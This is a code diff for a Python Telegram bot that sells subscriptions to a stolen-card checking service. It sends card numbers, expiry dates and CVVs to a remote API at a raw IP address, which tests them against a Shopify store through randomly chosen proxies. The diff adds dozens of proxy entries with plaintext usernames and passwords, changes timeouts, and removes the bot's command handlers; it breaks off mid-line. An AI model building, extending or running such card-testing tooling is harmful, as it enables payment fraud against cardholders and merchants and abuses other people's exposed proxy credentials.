@@ -20,8 +20,65 @@ OWNER_USERNAME = "@ESCROW2929"
 AUTHORIZED_ADMINS = {8785590284}
 DATA_FILE = "users_data.json"
 
-# Complete Proxy List
+# Complete Updated Proxy List
 PROXY_LIST = [
+    # New Added Proxies
+    "reseller3270s320237:7Grp9Gki@px052001.pointtoserver.com:10780",
+    "reseller3270s320237:7Grp9Gki@px051003.pointtoserver.com:10780",
+    "reseller3270s320237:7Grp9Gki@px043006.pointtoserver.com:10780",
+    "reseller3270s320237:7Grp9Gki@px410701.pointtoserver.com:10780",
+    "reseller3270s320237:7Grp9Gki@px015601.pointtoserver.com:10780",
+    "reseller3270s320237:7Grp9Gki@px490701.pointtoserver.com:10780",
+    "reseller3270s320237:7Grp9Gki@px591801.pointtoserver.com:10780",
+    "reseller3270s320237:7Grp9Gki@px022409.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px022505.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px022507.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px052001.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px051003.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px043006.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px410701.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px015601.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px490701.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px591801.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px022409.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px022408.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px173003.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px420602.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px031901.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px490402.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px460101.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px490401.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px041201.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px041202.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px470108.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px023004.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px023005.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px043005.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px043004.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px032004.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px014004.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px032002.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px040706.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px460403.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px400501.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px380101.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px013301.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px019603.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px520401.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px014236.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px040805.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px121102.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px121101.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px013304.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px440401.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px016104.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px180801.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px121001.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px150902.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px270401.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px591203.pointtoserver.com:10780",
+    "purevpn0s551451:9dpdlc2nfxgj@px591201.pointtoserver.com:10780",
+    # Previous Proxies
     "naveed:Qwerty_123ABC@196.244.48.124:12345",
     "harishankarchoubey:HvCjWdoIrK6szj8v@136.179.19.164:3128",
     "naveed:Qwerty_123ABC@196.244.48.26:12345",
@@ -339,10 +396,10 @@ async def process_card_string(card_line, user_full_name):
         site_url = "https://customsbyarrillc.myshopify.com"
         selected_proxy = random.choice(PROXY_LIST)
         
-        # Updated new API Endpoint format
+        # API Endpoint with increased timeout configuration
         api_url = f"http://216.250.119.63/?{quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxy)}"
         
-        async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as client:
+        async with httpx.AsyncClient(timeout=60.0, follow_redirects=True) as client:
             response = await client.get(api_url)
             if response.status_code != 200:
                 return f"❌ {card_line} ➔ API Server Error (Status Code: {response.status_code})"
@@ -367,7 +424,7 @@ async def process_card_string(card_line, user_full_name):
             f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gate} | 💰 {price}\n"
             f"━━━━━━━━━━━━━━━━━\n"
             f"🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨\n"
-            f"𝗕𝗜𝗡 𝗜𝗻𝐟𝗼: {bin_info}\n"
+            f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info}\n"
             f"𝗕𝗮𝗻𝗸: {bank_info}\n"
             f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
             f"━━━━━━━━━━━━━━━━━\n"
@@ -376,7 +433,7 @@ async def process_card_string(card_line, user_full_name):
         )
             
     except httpx.TimeoutException:
-        return f"❌ {card_line} ➔ API Timeout"
+        return f"❌ {card_line} ➔ API Timeout (Server took too long to respond)"
     except Exception as e:
         logger.error(f"Processing error: {str(e)}")
         return f"❌ {card_line} ➔ API Error / Connection Failed"
@@ -391,80 +448,4 @@ async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Subscription expired or no key redeemed. Use /redeem <key>.")
         return
     if not context.args:
-        await update.message.reply_text("❌ Usage: /chk CC|MM|YY|CVV")
-        return
-    card_line = "".join(context.args)
-    user_full_name = update.effective_user.first_name
-    msg = await update.message.reply_text("⌛ Checking card...")
-    res = await process_card_string(card_line, user_full_name)
-    await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=res)
-
-async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id in BANNED_USERS:
-        return
-    ALL_USERS.add(user_id)
-    save_data()
-    if not has_access(user_id):
-        await update.message.reply_text("❌ Subscription expired.")
-        return
-    text = update.message.text
-    lines = text.split('\n')[1:] if '\n' in text else []
-    if not lines:
-        await update.message.reply_text("❌ Send cards line-by-line below /chks")
-        return
-    user_full_name = update.effective_user.first_name
-    msg = await update.message.reply_text("⌛ Processing cards...")
-    results = [await process_card_string(line.strip(), user_full_name) for line in lines[:10] if "|" in line]
-    if results:
-        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text="\n\n".join(results))
-    else:
-        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text="❌ No valid cards found.")
-
-async def chf_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id in BANNED_USERS:
-        return
-    ALL_USERS.add(user_id)
-    save_data()
-    if not has_access(user_id):
-        await update.message.reply_text("❌ Subscription expired.")
-        return
-    document = update.message.document
-    if not document:
-        await update.message.reply_text("❌ Please upload a text file.")
-        return
-    user_full_name = update.effective_user.first_name
-    msg = await update.message.reply_text("⌛ Processing document file...")
-    file = await context.bot.get_file(document.file_id)
-    file_bytes = await file.download_as_bytearray()
-    file_text = file_bytes.decode("utf-8", errors="ignore")
-    lines = file_text.split('\n')
-    results = [await process_card_string(line.strip(), user_full_name) for line in lines[:10] if "|" in line]
-    if results:
-        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=f"📁 File Processed!\n\n" + "\n\n".join(results))
-    else:
-        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text="❌ File contains no valid card lines.")
-
-def main():
-    app = ApplicationBuilder().token(TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("adminpannel", admin_pannel))
-    app.add_handler(CommandHandler("users", show_users_command))
-    app.add_handler(CommandHandler("announcement", announcement_command))
-    app.add_handler(CommandHandler("key", generate_key))
-    app.add_handler(CommandHandler("redeem", redeem_key))
-    app.add_handler(CommandHandler("makeadmin", make_admin))
-    app.add_handler(CommandHandler("removeadmin", remove_admin))
-    app.add_handler(CommandHandler("ban", ban_user))
-    app.add_handler(CommandHandler("unban", unban_user))
-    app.add_handler(CommandHandler("chk", chk_card))
-    app.add_handler(CommandHandler("chks", chks_cards))
-    app.add_handler(CommandHandler("chf", chf_document))
-    app.add_handler(MessageHandler(filters.Document.ALL, chf_document))
-    print("Bot is up and running...")
-    app.run_polling()
-
-if __name__ == "__main__":
-    main()
-    
+        await update.message.reply_text("❌ Usage: /chk CC|MM
